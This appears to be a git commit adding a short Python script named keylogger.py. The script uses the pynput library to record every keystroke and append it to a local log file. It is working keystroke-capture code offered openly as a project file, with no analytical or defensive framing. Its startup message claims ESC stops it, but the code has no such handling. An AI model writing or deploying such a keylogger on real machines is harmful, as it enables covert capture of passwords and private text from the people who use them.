9c5a85b387624e76cb898004fe122f3ca955418f
Sahil Khan <skhan400391@gmail.com>
2025-08-07 17:58:23 +0530

    keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,19 @@
+from pynput import keyboard
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
+
+def main():
+    print("🔒 Keylogger started. Press ESC to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
